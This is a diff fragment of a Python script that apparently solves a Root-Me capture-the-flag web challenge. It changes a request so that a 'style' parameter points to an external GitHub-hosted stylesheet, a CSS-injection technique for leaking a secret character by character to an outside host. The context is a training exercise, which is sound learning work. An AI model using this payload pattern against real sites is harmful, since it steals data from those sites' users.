@@ -123,6 +123,6 @@ while 1:
         # request POST
         sleep(10) # for not to ban
         data = {"url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a"}
-        r = requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
+        r = requests.post("http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a", data=data)
         print(r.content)
         know += input("new chars to know : ")
